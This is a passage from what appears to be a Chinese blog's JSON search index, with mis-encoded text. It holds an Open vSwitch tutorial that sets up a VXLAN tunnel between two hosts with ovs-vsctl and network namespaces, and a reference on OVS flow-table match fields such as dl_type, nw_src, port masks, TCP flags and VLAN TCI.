œã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"vxlanç½‘ç»œ\" loading=\"lazy\" src=\"https://oss.typesafe.cn/vxlan01.png\"\u003e\u003c/p\u003e\n\u003ch1 id=\"ç®€å•vxlanå®éªŒ\"\u003eç®€å•VXLANå®éªŒ\u003c/h1\u003e\n\u003cp\u003eæˆ‘ä»¬å‚ç…§ä¸‹å›¾å®Œæˆå®éªŒã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"VXLANå®éªŒ\" loading=\"lazy\" src=\"https://oss.typesafe.cn/vxlan_topo.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"ä¸»æœºa\"\u003eä¸»æœºA\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# åˆ›å»ºéš§é“ç½‘æ¡¥\novs-vsctl add-br br-tun\n# åˆ›å»ºéš§é“ç«¯å£å¹¶æŒ‡å®šè¿œç«¯IPå’ŒVXLAN ID\novs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.232 options:key=1111\n# åˆ›å»ºå†…éƒ¨ç«¯å£\novs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal\n# åˆ›å»ºnetnsç”¨äºæ¨¡æ‹Ÿè™šæ‹Ÿç½‘ç»œè®¾å¤‡\nip netns add ns0\n# å°†å†…éƒ¨ç«¯å£ç§»åŠ¨åˆ°netnsä¸­\nip link set vnet0 netns ns0\n# å¯åŠ¨ç½‘å¡\nip netns exec ns0 ip link set lo up\nip netns exec ns0 ip link set vnet0 up\n# é…ç½®IP\nip netns exec ns0 ip addr add 192.168.0.1/24 dev vnet0\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"ä¸»æœºb\"\u003eä¸»æœºB\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# åˆ›å»ºéš§é“ç½‘æ¡¥\novs-vsctl add-br br-tun\n# åˆ›å»ºéš§é“ç«¯å£å¹¶æŒ‡å®šè¿œç«¯IPå’ŒVXLAN ID\novs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.231 options:key=1111\n# åˆ›å»ºå†…éƒ¨ç«¯å£\novs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal\n# åˆ›å»ºnetnsç”¨äºæ¨¡æ‹Ÿè™šæ‹Ÿç½‘ç»œè®¾å¤‡\nip netns add ns0\n# å°†å†…éƒ¨ç«¯å£ç§»åŠ¨åˆ°netnsä¸­\nip link set vnet0 netns ns0\n# å¯åŠ¨ç½‘å¡\nip netns exec ns0 ip link set lo up\nip netns exec ns0 ip link set vnet0 up\n# é…ç½®IP\nip netns exec ns0 ip addr add 192.168.0.2/24 dev vnet0\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"æµ‹è¯•\"\u003eæµ‹è¯•\u003c/h2\u003e\n\u003cp\u003eåœ¨\u003ccode\u003eä¸»æœºA\u003c/code\u003eä¸Šæµ‹è¯•ç½‘ç»œè¿é€šæ€§ \u003ccode\u003eip netns exec ns0 ping 192.168.0.2\u003c/code\u003e\u003c/p\u003e","title":"Open vSwitch å…¥é—¨å®è·µï¼ˆ6ï¼‰VXLANå®éªŒ"},{"content":"OpenvSwitch flow table æµè¡¨ OpenFlowï¼ˆOFï¼‰è¢«è®¤ä¸ºæ˜¯ç¬¬ä¸€ä¸ªè½¯ä»¶å®šä¹‰ç½‘ç»œï¼ˆSDNï¼‰æ ‡å‡†ä¹‹ä¸€ã€‚å®ƒæœ€åˆåœ¨SDNç¯å¢ƒä¸­å®šä¹‰äº†é€šä¿¡åè®®ï¼Œä½¿SDNæ§åˆ¶å™¨èƒ½å¤Ÿä¸ç‰©ç†å’Œè™šæ‹Ÿçš„äº¤æ¢æœºå’Œè·¯ç”±å™¨ç­‰ç½‘ç»œè®¾å¤‡çš„è½¬å‘å¹³é¢ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œä»è€Œæ›´å¥½åœ°é€‚åº”ä¸æ–­å˜åŒ–çš„ä¸šåŠ¡éœ€æ±‚ã€‚\nå¦‚æœæŠŠOpenFlowæ§åˆ¶å™¨æ¯”ä½œâ€œå¤§è„‘â€ï¼ŒOVSæµè¡¨å°±åƒæ˜¯â€œå¤§è…¿â€ä¸€æ ·æ¥å—æ¥è‡ªâ€œå¤§è„‘â€çš„æŒ‡ä»¤ï¼Œå†³å®šè¦å‘å“ªä¸ªæ–¹å‘å‰è¿›ã€‚ä½†OVSæµè¡¨åŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼Œåœ¨æ²¡æœ‰OpenFlowæ§åˆ¶å™¨æ—¶ï¼Œä¹Ÿå¯ä»¥è‡ªä¸»å·¥ä½œï¼Œå®ƒæœ¬èº«ä¹Ÿä¾›ä¸€äº›å‘½ä»¤è®©æˆ‘ä»¬å¯ä»¥ç›´æ¥ç®¡ç†æµè¡¨ã€‚\næ“ä½œå‘½ä»¤ æŸ¥çœ‹æµè¡¨è§„åˆ™ # æŸ¥çœ‹br-tunä¸Šçš„å…¨éƒ¨æµè¡¨è§„åˆ™ ovs-ofctl dump-flows br-tun æ·»åŠ æˆ–ä¿®æ”¹æµè¡¨è§„åˆ™ ovs-ofctl addâˆ’flowï¼addâˆ’flowsï¼modâˆ’flows â€œæµè¡¨åŒ¹é…æ¡ä»¶,actions=[åŠ¨ä½œ1][,åŠ¨ä½œ2â€¦]â€ å¦‚æœä½ æœ‰è¿‡ç¼–ç¨‹çš„ç»éªŒï¼Œæµè¡¨è§„åˆ™å…¶å®å°±æ˜¯ä¸€ä¸ªä¸ªç®€å•çš„ifè¯­å¥ï¼Œä¼ªä»£ç å¦‚ä¸‹ã€‚\nif (æµè¡¨åŒ¹é…æ¡ä»¶){ åŠ¨ä½œ1ï¼Œ åŠ¨ä½œ2... } if (æµè¡¨åŒ¹é…æ¡ä»¶){ åŠ¨ä½œ1ï¼Œ åŠ¨ä½œ2... } åˆ é™¤æµè¡¨è§„åˆ™ # åˆ é™¤br-tunä¸Šçš„å…¨éƒ¨æµè¡¨è§„åˆ™ ovs-ofctl del-flows br-tun # åˆ é™¤br-tunä¸ŠåŒ¹é…xxçš„å…¨éƒ¨æµè¡¨è§„åˆ™ ovs-ofctl del-flows br-tun xx æµè¡¨åŒ¹é…æ¡ä»¶ OVS æµè¡¨åŒ¹é…æ¡ä»¶è¾ƒå¤šï¼Œä¸‹é¢æˆ‘å°†å…¶åˆ†æˆå››éƒ¨åˆ†æ¥è¯´æ˜ï¼Œåˆ†åˆ«æ˜¯:\nOVSåŒ¹é…æ¡ä»¶ OSIæ¨¡å‹ç¬¬äºŒå±‚ã€æ•°æ®é“¾è·¯å±‚ã€‘ OSIæ¨¡å‹ç¬¬ä¸‰å±‚ã€ç½‘ç»œå±‚ã€‘ OSIæ¨¡å‹ç¬¬å››å±‚ã€ä¼ è¾“å±‚ã€‘ OVSåŒ¹é…æ¡ä»¶ in_port=port æµé‡è¿›å…¥çš„ç«¯å£ç¼–å·æˆ–è€…åç§°ï¼Œç¤ºä¾‹ in_port=br-int\ntable=number è§„åˆ™ä¿å­˜çš„æµè¡¨ç¼–å·ï¼ŒèŒƒå›´æ˜¯ 0-254ï¼Œé»˜è®¤å€¼ï¼š0ã€‚\nOSIæ¨¡å‹ç¬¬äºŒå±‚ã€æ•°æ®é“¾è·¯å±‚ã€‘ dl å³æ˜¯ data link çš„ç¼©å†™ã€‚\ndl_type=ethertype åŒ¹é…ä»¥å¤ªç½‘åè®®ç±»å‹ä»¥å¤ªç±»å‹ï¼Œä»¥10åˆ°65535ä¹‹é—´çš„æ•´æ•°ï¼ˆåŒ…æ‹¬0å’Œ65535ï¼‰æŒ‡å®šï¼Œä»¥åè¿›åˆ¶æˆ–ä»¥0xå‰ç¼€çš„åå…­è¿›åˆ¶æ•°è¡¨ç¤ºï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\ndl_type=0x0800 åŒ¹é…IPv4æ•°æ®åŒ…ï¼Œç­‰åŒäºdl_type=ip ã€‚\ndl_type=0x086dd åŒ¹é…IPv6æ•°æ®åŒ…ï¼Œç­‰åŒäºdl_type=ipv6 ã€‚\ndl_type=0x0806 åŒ¹é…ARPæ•°æ®åŒ…ï¼Œç­‰åŒäºdl_type=arp ã€‚\ndl_type=0x8035 åŒ¹é…RARPæ•°æ®åŒ…ï¼Œç­‰åŒäº dl_type=rarpã€‚\ndl_vlan=vlan æ•°æ®åŒ…çš„ VLAN Tag å€¼ï¼ŒèŒƒå›´æ˜¯ 0-4095ï¼Œ0xffff ä»£è¡¨ä¸åŒ…å« VLAN Tag çš„æ•°æ®åŒ…\ndl_vlan_pcp=priority VLAN ä¼˜å…ˆçº§ï¼Œå–å€¼åŒºé—´ä¸º[0-7]ã€‚æ•°å­—è¶Šå¤§ï¼Œè¡¨ç¤ºä¼˜å…ˆçº§è¶Šé«˜ã€‚\ndl_src=xx:xx:xx:xx:xx:xx dl_dst=xx:xx:xx:xx:xx:xx æºæˆ–ç›®çš„çš„ MACåœ°å€\nåœ°å€01:00:00:00:00:00/01:00:00:00:00:00 ä»£è¡¨å¹¿æ’­ åœ°å€00:00:00:00:00:00/01:00:00:00:00:00 ä»£è¡¨å•æ’­ åœ°å€fe:ff:ff:ff:ff:ff åŒ¹é…é™¤å¤šæ’­ä½ä»¥å¤–çš„æ‰€æœ‰ä½ï¼ŒåŸºæœ¬ä¸Šä¸ä¼šç”¨åˆ°ã€‚ åœ°å€ff:ff:ff:ff:ff:ff å®Œå…¨åŒ¹é…ï¼ˆç­‰åŒäºçœç•¥å­ç½‘æ©ç ï¼‰ã€‚ åœ°å€00:00:00:00:00:00 åŒ¹é…å…¨éƒ¨ä½ï¼ˆç­‰åŒäº dl_dst=*ï¼‰ã€‚ OSIæ¨¡å‹ç¬¬ä¸‰å±‚ã€ç½‘ç»œå±‚ã€‘ nw_src=ip[/netmask] nw_dst=ip[/netmask] å¦‚æœdl_typeä¸º0x0800ï¼ˆå¯èƒ½æ˜¯é€šè¿‡ç®€å†™å½¢å¼ï¼Œä¾‹å¦‚ipæˆ–tcpï¼‰ï¼Œåˆ™åŒ¹é…IPv4æºï¼ˆæˆ–ç›®æ ‡ï¼‰åœ°å€ipï¼Œå¯ä»¥å°†å…¶æŒ‡å®šä¸ºIPåœ°å€æˆ–ä¸»æœºåï¼ˆä¾‹å¦‚192.168.1.1æˆ–www.example.comï¼‰ã€‚å¯é€‰çš„ç½‘ç»œæ©ç å…è®¸å°†åŒ¹é…é™åˆ¶ä¸ºIPv4åœ°å€å‰ç¼€ã€‚ç½‘ç»œæ©ç å¯ä»¥æŒ‡å®šä¸ºç‚¹åˆ†å››è¾¹å½¢ï¼ˆä¾‹å¦‚192.168.1.0/255.255.255.0ï¼‰æˆ–CIDRå—ï¼ˆä¾‹å¦‚192.168.1.0/24ï¼‰ã€‚ Open vSwitch 1.8å’Œæ›´é«˜ç‰ˆæœ¬æ”¯æŒä»»æ„ç‚¹çŠ¶å››å…ƒæ©ç ï¼›æ—©æœŸç‰ˆæœ¬ä»…æ”¯æŒCIDRæ©ç ï¼Œå³ç­‰æ•ˆäºæŸäº›CIDRå—çš„è™šçº¿å››è¾¹å½¢ã€‚\nå½“æŒ‡å®š dl_typeä¸º0x0800 æˆ–è€…ipæ—¶ï¼ŒåŒ¹é…æºæˆ–è€…ç›®æ ‡çš„ IPv4 åœ°å€ï¼Œå¯ä»¥å°†å…¶æŒ‡å®šä¸ºIPåœ°å€æˆ–ä¸»æœºåï¼Œä¾‹å¦‚192.168.1.1æˆ–www.typesafe.cnã€‚åŒæ—¶ä¹Ÿå¯ä»¥å†™ä½œ192.168.1.0/255.255.255.0æˆ–è€…192.168.1.0/24çš„å½¢å¼ã€‚ å½“æŒ‡å®šdl_typeä¸º0x0806æˆ–arpæ—¶ï¼Œåˆ†åˆ«ä¸IPv4å’ŒEthernetçš„ARPæ•°æ®åŒ…ä¸­çš„ar_spaæˆ–ar_tpaå­—æ®µåŒ¹é…ã€‚ å½“æŒ‡å®šdl_typeä¸º0x8035æˆ–rarpæ—¶ï¼Œåˆ†åˆ«ä¸IPv4å’ŒEthernetçš„RARPæ•°æ®åŒ…ä¸­çš„ar_spaæˆ–ar_tpaå­—æ®µåŒ¹é…ã€‚ å½“æŒ‡å®šdl_typeä¸º0x0800ã€0x0806æˆ–0x8035ä¹‹å¤–çš„å…¶ä»–å€¼æ—¶ï¼Œå°†å¿½ç•¥nw_srcå’Œnw_dstçš„å€¼ã€‚ nw_proto=proto ipproto=proto å¦‚æœæŒ‡å®šipæˆ–dl_type=0x0800ï¼Œåˆ™åŒ¹é…IPåè®®ç±»å‹protoï¼Œè¯¥åè®®ç±»å‹è¢«æŒ‡å®šä¸º0åˆ°255ä¹‹é—´çš„åè¿›åˆ¶æ•°ï¼ˆåŒ…æ‹¬1å’Œ0ï¼Œç”¨äºåŒ…å«ICMPæ•°æ®åŒ…æˆ–6ä»¥åŒ¹é…TCPæ•°æ®åŒ…ï¼‰ã€‚ å¦‚æœæŒ‡å®šäº†ipv6æˆ–dl_type=0x86ddï¼Œåˆ™åŒ¹é…IPv6æ ‡å¤´ç±»å‹åŸå‹ï¼Œè¯¥å½¢å¼æŒ‡å®šä¸º0åˆ°255ä¹‹é—´çš„åè¿›åˆ¶æ•°å­—ï¼ˆä¾‹å¦‚ï¼ŒåŒ…æ‹¬58ä»¥åŒ¹é…ICMPv6æ•°æ®åŒ…æˆ–6ä»¥åŒ¹é…TCPï¼‰ã€‚æ ‡å¤´ç±»å‹æ˜¯è®¾è®¡æ–‡æ¡£ä¸­æè¿°çš„ç»ˆç«¯æ ‡å¤´ã€‚ å½“æŒ‡å®šarpæˆ–dl_type=0x0806æ—¶ï¼Œä¸ARPæ“ä½œç çš„ä½8ä½åŒ¹é…ã€‚å¤§äº255çš„ARPæ“ä½œç è¢«è§†ä¸º0ã€‚ æŒ‡å®šrarpæˆ–dl_type=0x8035æ—¶ï¼Œä¸ARPæ“ä½œç çš„ä½8ä½åŒ¹é…ã€‚å¤§äº255çš„ARPæ“ä½œç è¢«è§†ä¸º0ã€‚ å½“é€šé…ç¬¦dl_typeæˆ–å°†å…¶è®¾ç½®ä¸º0x0800ã€0x0806ã€0x8035æˆ–0x86ddä¹‹å¤–çš„å…¶ä»–å€¼æ—¶ï¼Œå°†å¿½ç•¥nw_protoçš„å€¼ï¼ˆè¯·å‚è§ä¸Šé¢çš„æµè¯­æ³•ï¼‰ã€‚ nw_tos=tos åŒ¹é…IP ToS / DSCPæˆ–IPv6æµé‡ç±»åˆ«å­—æ®µtosï¼Œè¯¥å­—æ®µtosæŒ‡å®šä¸º0åˆ°255ä¹‹é—´çš„åè¿›åˆ¶æ•°å­—ï¼ˆåŒ…æ‹¬0å’Œ255ï¼‰ã€‚è¯·æ³¨æ„ï¼Œå‡ºäºåŒ¹é…ç›®çš„ï¼Œå°†å¿½ç•¥ä¸¤ä¸ªè¾ƒä½çš„ä¿ç•™ä½ã€‚\nå½“é€šé…ç¬¦dl_typeæˆ–å°†å…¶è®¾ç½®ä¸º0x0800æˆ–0x86ddä¹‹å¤–çš„å…¶ä»–å€¼æ—¶ï¼Œå°†å¿½ç•¥nw_tosçš„å€¼ã€‚\nip_dscp=dscp åŒ¹é…IP ToS / DSCPæˆ–IPv6æµé‡ç±»å­—æ®µdscpï¼Œè¯¥å­—æ®µæŒ‡å®šä¸ºä»‹äº0å’Œ63ä¹‹é—´ï¼ˆå«0å’Œ63ï¼‰çš„åè¿›åˆ¶æ•°ã€‚\nå½“é€šé…ç¬¦dl_typeæˆ–å°†å…¶è®¾ç½®ä¸º0x0800æˆ–0x86ddä¹‹å¤–çš„å…¶ä»–å€¼æ—¶ï¼Œå°†å¿½ç•¥ip_dscpçš„å€¼ï¼ˆè¯·å‚è§ä¸Šé¢çš„æµè¯­æ³•ï¼‰ã€‚\nnw_ecn=ecn ip_ecn=ecn åŒ¹é…IP ToSæˆ–IPv6æµé‡ç±»åˆ«å­—æ®µä¸­çš„ecnä½ï¼Œè¯¥ecnä½æŒ‡å®šä¸º0åˆ°3ï¼ˆå«0å’Œ3ï¼‰ä¹‹é—´çš„åè¿›åˆ¶æ•°ã€‚å½“é€šé…ç¬¦dl_typeæˆ–å°†å…¶è®¾ç½®ä¸º0x0800æˆ–0x86ddä¹‹å¤–çš„å…¶ä»–å€¼æ—¶ï¼Œå°†å¿½ç•¥nw_ecnçš„å€¼ï¼ˆè¯·å‚è§ä¸Šé¢çš„æµè¯­æ³•ï¼‰ã€‚\nnw_ttl=ttl åŒ¹é…IP TTLæˆ–IPv6è·ƒç‚¹é™åˆ¶å€¼ttlï¼Œè¯¥å€¼æŒ‡å®šä¸º0åˆ°255ä¹‹é—´çš„åè¿›åˆ¶æ•°å­—ï¼ˆåŒ…æ‹¬0å’Œ255ï¼‰ã€‚\nå½“é€šé…ç¬¦dl_typeæˆ–å°†å…¶è®¾ç½®ä¸º0x0800æˆ–0x86ddä¹‹å¤–çš„å…¶ä»–å€¼æ—¶ï¼Œå°†å¿½ç•¥nw_ttlçš„å€¼ï¼ˆè¯·å‚è§ä¸Šé¢çš„æµè¯­æ³•ï¼‰ã€‚\nOSIæ¨¡å‹ç¬¬å››å±‚ã€ä¼ è¾“å±‚ã€‘ tcp_src=port tcp_dst=port udp_src=port udp_dst=port sctp_src=port sctp_dst=port åŒ¹é…TCPï¼ŒUDPæˆ–SCTPæºç«¯å£æˆ–ç›®æ ‡ç«¯å£ï¼Œç«¯å£å·æŒ‡å®šä¸º0åˆ°65535ï¼ˆå«0å’Œ65535ï¼‰ä¹‹é—´çš„åè¿›åˆ¶æ•°ã€‚\nå½“é€šé…ç¬¦dl_typeå’Œnw_protoæˆ–å°†å…¶è®¾ç½®ä¸ºä¸è¡¨ç¤ºé€‚å½“åè®®çš„å€¼æ—¶ï¼Œè¿™äº›è®¾ç½®çš„å€¼å°†è¢«å¿½ç•¥ï¼ˆè¯·å‚è§ä¸Šé¢çš„æµè¯­æ³•ï¼‰ã€‚\ntcp_src=port/mask tcp_dst=port/mask udp_src=port/mask udp_dst=port/mask sctp_src=port/mask sctp_dst=port/mask TCPï¼ˆæˆ–UDPæˆ–SCTPï¼‰æºæˆ–ç›®æ ‡ç«¯å£ä¸Šçš„æŒ‰ä½åŒ¹é…ã€‚ç«¯å£å’Œæ©ç æ˜¯16ä½æ•°å­—ï¼Œä»¥åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶å†™ä¸º0xã€‚æ©ç ä¸­çš„æ¯ä¸ª1ä½è¦æ±‚ç«¯å£ä¸­çš„ç›¸åº”ä½å¿…é¡»åŒ¹é…ã€‚æ©ç ä¸­çš„æ¯ä¸ª0ä½éƒ½ä¼šå¯¼è‡´å¿½ç•¥ç›¸åº”çš„ä½ã€‚\nä¼ è¾“ç«¯å£ä¸Šçš„æŒ‰ä½åŒ¹é…å¾ˆå°‘åœ¨éš”ç¦»ä¸­æœ‰ç”¨ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ä¸€ç»„åŒ¹é…é¡¹æ¥å‡å°‘åœ¨ä¸€ç³»åˆ—ä¼ è¾“ç«¯å£ä¸Šè¿›è¡ŒåŒ¹é…æ‰€éœ€çš„æµæ•°ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ç›®æ ‡æ˜¯å°†TCPæºç«¯å£1000åŒ¹é…åˆ°1999ï¼ˆå«ï¼‰ã€‚ä¸€ç§æ–¹æ³•æ˜¯æ’å…¥1000ä¸ªæµï¼Œæ¯ä¸ªæµåœ¨å•ä¸ªæºç«¯å£ä¸ŠåŒ¹é…ã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯æŸ¥çœ‹1000å’Œ1999çš„äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n01111101000 11111001111 ç„¶åå°†å…¶è½¬æ¢ä¸ºä¸€ç³»åˆ—æŒ‰ä½åŒ¹é…ï¼Œä»¥å®ç°ç›¸åŒçš„ç»“æœï¼š\n01111101xxx 0111111xxxx 10xxxxxxxxx 110xxxxxxxx 1110xxxxxxx 11110xxxxxx 1111100xxxx ä½¿ç”¨ovs-ofctlæ‰€éœ€çš„è¯­æ³•ç¼–å†™æ—¶ï¼Œè¿™äº›å†…å®¹å¦‚ä¸‹ï¼š\ntcp,tcp_src=0x03e8/0xfff8 tcp,tcp_src=0x03f0/0xfff0 tcp,tcp_src=0x0400/0xfe00 tcp,tcp_src=0x0600/0xff00 tcp,tcp_src=0x0700/0xff80 tcp,tcp_src=0x0780/0xffc0 tcp,tcp_src=0x07c0/0xfff0 ä»…Open vSwitch 1.6å’Œæ›´é«˜ç‰ˆæœ¬æ”¯æŒä¼ è¾“ç«¯å£ä¸Šçš„æŒ‰ä½åŒ¹é…ã€‚\nä¸ä¸Šè¿°å®Œå…¨åŒ¹é…å½¢å¼ä¸€æ ·ï¼ŒæŒ‰ä½åŒ¹é…å½¢å¼ä»…åœ¨dl_typeå’Œnw_protoæŒ‡å®šTCPæˆ–UDPæˆ–SCTPæ—¶é€‚ç”¨ã€‚\ntp_src=port tp_dst=port è¿™äº›æ˜¯L4ç«¯å£åŒ¹é…é¡¹å·²å¼ƒç”¨çš„é€šç”¨å½¢å¼ã€‚åœ¨æ–°ä»£ç ä¸­ï¼Œè¯·ä½¿ç”¨ä¸Šè¿°ç‰¹å®šäºTCPï¼ŒUDPæˆ–SCTPçš„å½¢å¼ã€‚\ntcp_flags=flags/mask tcp_flags=[+flag\u0026hellip;][-flag\u0026hellip;] TCPæ ‡å¿—æŒ‰ä½åŒ¹é…ã€‚æ ‡å¿—å’Œæ©ç æ˜¯16ä½æ•°å­—ï¼Œä»¥åè¿›åˆ¶æˆ–ä»¥0xä¸ºå‰ç¼€çš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚æ©ç ä¸­çš„æ¯ä¸ª1ä½è¦æ±‚æ ‡å¿—ä¸­çš„ç›¸åº”ä½å¿…é¡»åŒ¹é…ã€‚æ©ç ä¸­çš„æ¯ä¸ª0ä½éƒ½ä¼šå¯¼è‡´å¿½ç•¥ç›¸åº”çš„ä½ã€‚ æˆ–è€…ï¼Œå¯ä»¥é€šè¿‡æ ‡å¿—çš„ç¬¦å·åï¼ˆåœ¨ä¸‹é¢åˆ—å‡ºï¼‰æ¥æŒ‡å®šæ ‡å¿—ï¼Œæ¯ä¸ªæ ‡å¿—åçš„å‰é¢éƒ½å¸¦æœ‰+ï¼Œè¡¨ç¤ºå¿…é¡»è®¾ç½®çš„æ ‡å¿—ï¼Œæˆ–è€…-è¡¨ç¤ºå¿…é¡»å–æ¶ˆè®¾ç½®çš„æ ‡å¿—ï¼Œä¸”æ ‡å¿—ä¹‹é—´æ²¡æœ‰å…¶ä»–å®šç•Œç¬¦ã€‚æœªæåŠçš„æ ‡å¿—æ˜¯é€šé…ç¬¦ã€‚ä¾‹å¦‚ï¼Œtcpï¼Œtcp_flags = + syn-ackåŒ¹é…ä¸æ˜¯ACKçš„TCP SYNã€‚ TCPåè®®å½“å‰å®šä¹‰9ä¸ªæ ‡å¿—ä½ï¼Œå¹¶ä¿ç•™å¦å¤–3ä¸ªä½ï¼ˆå¿…é¡»ä½œä¸ºé›¶å‘é€ï¼‰ï¼Œè¯·å‚é˜…RFC 793ã€3168å’Œ3540ã€‚è¿™äº›æ ‡å¿—ä½çš„ç¼–å·ä»æœ€ä½æœ‰æ•ˆä½å¼€å§‹ï¼š\n0ï¼šfin æŸ¥æ‰¾ä¸å†æœ‰æ¥è‡ªå‘é€æ–¹çš„æ•°æ®ã€‚ 1ï¼šsyn åŒæ­¥åŒæ­¥åºåˆ—å·ã€‚ 2ï¼šrst é‡ç½®è¿æ¥ã€‚ 3ï¼špsh æ¨é€åŠŸèƒ½ã€‚ 4ï¼šack ç¡®è®¤å­—æ®µæœ‰æ•ˆã€‚ 5ï¼šurg ç´§æ€¥æŒ‡é’ˆå­—æ®µæœ‰æ•ˆã€‚ 6ï¼šece ECNå›æ˜¾ã€‚ 7ï¼šcer å‡å°‘æ‹¥å¡çª—å£ã€‚ 8ï¼šns ç°æ—¶æ€»å’Œ 9-11ï¼šä¿ç•™ã€‚ 12-15ï¼šä¸å¤„ç†ï¼Œå¿…é¡»ä¸ºé›¶ã€‚ icmp_type=type icmp_code=code å½“dl_typeå’Œnw_protoæŒ‡å®šICMPæˆ–ICMPv6æ—¶ï¼ŒtypeåŒ¹é…ICMPç±»å‹ï¼Œè€Œä»£ç åŒ¹é…ICMPä»£ç ã€‚æ¯ä¸ªå‚æ•°éƒ½æŒ‡å®šä¸ºä»‹äº0å’Œ255ä¹‹é—´ï¼ˆå«ä¸¤ç«¯ï¼‰çš„åè¿›åˆ¶æ•°ã€‚\nå½“dl_typeå’Œnw_protoé‡‡ç”¨å…¶ä»–å€¼æ—¶ï¼Œè¿™äº›è®¾ç½®çš„å€¼å°†è¢«å¿½ç•¥ï¼ˆè¯·å‚è§ä¸Šé¢çš„æµè¯­æ³•ï¼‰ã€‚\nmetadata=value[/mask] åœ¨å…ƒæ•°æ®å­—æ®µä¸­å®Œå…¨åŒ¹é…å€¼æˆ–ä½¿ç”¨å¯é€‰æ©ç åŒ¹é…å€¼ã€‚ valueå’Œmaskæ˜¯64ä½æ•´æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºåè¿›åˆ¶ï¼ˆä½¿ç”¨0xå‰ç¼€æŒ‡å®šåå…­è¿›åˆ¶ï¼‰ã€‚å…è®¸ä½¿ç”¨ä»»æ„æ©ç å€¼ï¼šæ©ç ä¸­çš„1ä½è¡¨ç¤ºå€¼ä¸­çš„å¯¹åº”ä½å¿…é¡»å®Œå…¨åŒ¹é…ï¼Œè€Œè¯¥ä½åˆ™ä½¿ç”¨0ä½é€šé…ç¬¦ã€‚åœ¨Open vSwitch 1.8ä¸­æ·»åŠ äº†å¯¹å…ƒæ•°æ®çš„åŒ¹é…ã€‚\nip ç­‰åŒäºdl_type=0x0800\nipv6 ç­‰åŒäºdl_type=0x86dd\nicmp ç­‰åŒäºdl_type=0x0800,nw_proto=1\nicmp6 ç­‰åŒäºdl_type=0x86dd,nw_proto=58\ntcp ç­‰åŒäºdl_type=0x0800,nw_proto=6\ntcp6 ç­‰åŒäºdl_type=0x86dd,nw_proto=6\nudp ç­‰åŒäºdl_type=0x0800,nw_proto=17\nudp6 ç­‰åŒäºdl_type=0x86dd,nw_proto=17\nsctp ç­‰åŒäºdl_type=0x0800,nw_proto=132\nsctp6 ç­‰åŒäºdl_type=0x86dd,nw_proto=132\narp ç­‰åŒäºdl_type=0x0806\nrarp ç­‰åŒäºdl_type=0x8035\nmpls ç­‰åŒäºdl_type=0x8847\nmplsm ç­‰åŒäºdl_type=0x8848\nvlan_tci=tci[/mask] åŒ¹é…ä¿®æ”¹åçš„VLAN TCI tciã€‚å¦‚æœçœç•¥maskï¼Œåˆ™tciæ˜¯è¦åŒ¹é…çš„ç¡®åˆ‡VLAN TCIï¼›å¦‚æœæŒ‡å®šäº†maskï¼Œåˆ™maskä¸­çš„1ä½è¡¨ç¤ºtciä¸­çš„å¯¹åº”ä½å¿…é¡»å®Œå…¨åŒ¹é…ï¼Œè€Œ0ä½é€šé…ç¬¦è¡¨ç¤ºè¯¥ä½ã€‚ tciå’Œmaskå‡ä¸º16ä½å€¼ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºåè¿›åˆ¶ã€‚ä½¿ç”¨0xå‰ç¼€ä»¥åå…­è¿›åˆ¶æŒ‡å®šå®ƒä»¬ã€‚\nå¯¹äºæ²¡æœ‰802.1Qæ ‡å¤´çš„æ•°æ®åŒ…ï¼Œvlan_tciä¸ä¹‹åŒ¹é…çš„å€¼ä¸º0ã€‚å¦åˆ™ï¼Œå®ƒæ˜¯802.1Qæ ‡å¤´ä¸­çš„TCIå€¼ï¼Œå…¶ä¸­CFIä½ï¼ˆå€¼ä¸º0x1000ï¼‰è¢«å¼ºåˆ¶ä¸º1ã€‚\nvlan_tci=0 ä»…åŒ¹é…æ²¡æœ‰802.1Qæ ‡å¤´çš„æ•°æ®åŒ…ã€‚\nvlan_tci=0xf123 åŒ¹é…VLAN 0x123ä¸­æ ‡è®°ä¸ºä¼˜å…ˆçº§7çš„æ•°æ®åŒ…ã€‚\nvlan_tci=0x1123/0x1fff åŒ¹é…æ ‡è®°æœ‰VLAN 0x123ï¼ˆå’Œä»»ä½•ä¼˜å…ˆçº§ï¼‰çš„æ•°æ®åŒ…ã€‚\nvlan_tci=0x5000/0xf000 åŒ¹é…æ ‡è®°ä¸ºä¼˜å…ˆçº§2çš„æ•°æ®åŒ…ï¼ˆåœ¨ä»»ä½•VLANä¸­ï¼‰ã€‚\nvlan_tci=0/0xfff åŒ¹é…æ²¡æœ‰802.1Qæ ‡å¤´æˆ–å¸¦æœ‰VLAN 0ï¼ˆå’Œä»»ä½•ä¼˜å…ˆçº§ï¼‰æ ‡è®°çš„æ•°æ®åŒ…ã€‚\nvlan_tci=0x5000/0xe000 åŒ¹é…æ²¡æœ‰802.1Qæ ‡å¤´æˆ–å¸¦æœ‰ä¼˜å…ˆçº§2æ ‡è®°çš„æ•°æ®åŒ…ï¼ˆåœ¨ä»»ä½•VLANä¸­ï¼‰ã€‚\nvlan_tci=0/0xefff åŒ¹é…æ²¡æœ‰802.1Qæ ‡å¤´æˆ–å¸¦æœ‰VLAN 0å’Œä¼˜å…ˆçº§0æ 